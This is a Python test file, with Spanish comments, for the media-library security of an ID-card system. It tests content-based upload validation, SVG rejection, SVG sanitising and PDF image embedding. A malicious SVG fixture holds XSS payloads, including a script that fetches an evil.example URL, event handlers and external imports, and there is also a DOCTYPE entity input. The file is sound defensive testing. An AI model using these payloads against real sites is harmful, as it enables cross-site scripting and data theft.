"""B-8: seguridad de la biblioteca de medios del carnet.

Cubre la validación por contenido real, el rechazo de SVG en subidas nuevas, el
saneamiento de SVG históricos y que el PDF siga incrustando un PNG válido.
"""
import xml.etree.ElementTree as ET
from io import BytesIO

import pytest
from PIL import Image

from apps.carnetizacion.domain.services.svg_seguro import sanear_svg
from apps.carnetizacion.domain.services.validador_multimedia import (
    MENSAJE_SVG_NO_SOPORTADO,
    validar_archivo_biblioteca,
)
from core.domain.exceptions import ValidationError

PNG_VALIDO = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\rIDATx\x9cc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa74d\xaa\x00\x00\x00\x00IEND\xaeB`\x82"

SVG_SEGURO = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle id="ok" cx="50" cy="50" r="40" fill="yellow" />
</svg>"""

SVG_MALICIOSO = b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     viewBox="0 0 100 100" onload="alert('xss')">
  <script>fetch('https://evil.example/robar')</script>
  <foreignObject><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>
  <style>@import url(https://evil.example/a.css);</style>
  <a xlink:href="https://evil.example/x"><text>clic</text></a>
  <image xlink:href="https://evil.example/logo.png" width="10" height="10"/>
  <use xlink:href="#permitido" />
  <circle cx="10" cy="10" r="5" fill="url(https://evil.example/p.svg#g)" />
  <circle onclick="evil()" cx="20" cy="20" r="5" fill="#0f0" />
</svg>"""


def _jpeg_valido() -> bytes:
    salida = BytesIO()
    Image.new('RGB', (8, 8), (10, 20, 30)).save(salida, 'JPEG')
    return salida.getvalue()


def _png_valido() -> bytes:
    salida = BytesIO()
    Image.new('RGBA', (8, 8), (10, 20, 30, 255)).save(salida, 'PNG')
    return salida.getvalue()


def test_validador_acepta_png_y_jpeg_por_su_contenido_real():
    mime_png, tamano_png = validar_archivo_biblioteca(
        contenido=PNG_VALIDO, nombre_archivo="logo.png", categoria="logo",
    )
    assert (mime_png, tamano_png) == ("image/png", len(PNG_VALIDO))

    jpeg = _jpeg_valido()
    mime_jpeg, tamano_jpeg = validar_archivo_biblioteca(
        contenido=jpeg, nombre_archivo="foto.jpeg", categoria="imagen",
    )
    assert (mime_jpeg, tamano_jpeg) == ("image/jpeg", len(jpeg))


def test_validador_rechaza_extension_que_no_coincide_con_el_contenido():
    with pytest.raises(ValidationError, match="no coincide con su contenido real"):
        validar_archivo_biblioteca(
            contenido=PNG_VALIDO, nombre_archivo="logo.jpg", categoria="logo",
        )


def test_validador_no_confia_en_el_content_type_declarado():
    with pytest.raises(ValidationError, match="SVG no se aceptan"):
        validar_archivo_biblioteca(
            contenido=SVG_SEGURO,
            nombre_archivo="logo.png",
            categoria="logo",
            content_type_declarado="image/png",
        )


def test_validador_rechaza_svg_con_mensaje_claro():
    with pytest.raises(ValidationError, match="SVG no se aceptan") as error:
        validar_archivo_biblioteca(
            contenido=SVG_MALICIOSO, nombre_archivo="firma.svg", categoria="firma",
        )
    assert "PNG o JPEG" in str(error.value)
    assert MENSAJE_SVG_NO_SOPORTADO in str(error.value)


def test_sanear_svg_elimina_scripts_eventos_estilos_y_recursos_externos():
    saneado = sanear_svg(SVG_MALICIOSO)
    assert saneado is not None
    texto = saneado.decode("utf-8").lower()

    for peligro in (
        "<script", "onload", "onclick", "foreignobject", "<style", "@import",
        "javascript:", "evil.example", "https://", "xlink:href=\"http",
    ):
        assert peligro not in texto, peligro

    # Conserva el dibujo seguro y la referencia interna.
    assert "<circle" in texto
    assert 'href="#permitido"' in texto
    ET.fromstring(saneado)  # el resultado sigue siendo XML válido


def test_sanear_svg_conserva_un_svg_simple():
    saneado = sanear_svg(SVG_SEGURO)
    assert saneado is not None
    texto = saneado.decode("utf-8")
    assert "circle" in texto
    assert 'fill="yellow"' in texto


def test_sanear_svg_rechaza_doctype_entidades_y_xml_invalido():
    assert sanear_svg(b'<!DOCTYPE svg [<!ENTITY x "boom">]><svg xmlns="http://www.w3.org/2000/svg">&x;</svg>') is None
    assert sanear_svg(b'<svg xmlns="http://www.w3.org/2000/svg"><g></svg>') is None
    assert sanear_svg(b'esto no es un svg') is None


def test_pdf_incrusta_un_png_valido_de_la_biblioteca(monkeypatch):
    from apps.carnetizacion.infrastructure.pdf import carnet_pdf

    monkeypatch.setattr(carnet_pdf, 'imagen_de_biblioteca', lambda _id: _png_valido())
    definicion = {
        'dimensiones': {'ancho_mm': 54, 'alto_mm': 85.6},
        'bg': {'anverso': '#ffffff', 'reverso': '#ffffff'},
        'anverso': [
            {'id': 'logo', 'tipo': 'image', 'x': 5, 'y': 60, 'w': 30, 'h': 10,
             'props': {'biblioteca_id': '42', 'label': 'LOGO'}},
        ],
        'reverso': [],
    }

    pdf = carnet_pdf.generar_carnet_pdf_fiel(
        definicion,
        {
            'nombre_completo': 'ANA PÉREZ',
            'cedula': '12345678',
            'cargo': 'ANALISTA',
            'departamento': 'TECNOLOGÍA',
            'security_hash': 'hash-b8',
        },
    )

    assert pdf.startswith(b'%PDF')
    assert b'/Subtype /Image' in pdf


def test_pdf_ignora_medios_svg_historicos(monkeypatch):
    """ReportLab no dibuja SVG: se descarta el medio y el diseño usa su respaldo."""
    from apps.carnetizacion.infrastructure.pdf import carnet_pdf
    from apps.carnetizacion.infrastructure.repositories.repo_carnetizacion_orm import (
        RepoCarnetizacionORM,
    )

    monkeypatch.setattr(
        RepoCarnetizacionORM,
        'obtener_archivo_biblioteca',
        lambda self, _id: (SVG_SEGURO, 'image/svg+xml', 'sello.svg'),
    )

    assert carnet_pdf.imagen_de_biblioteca('svg-historico-b8') is None
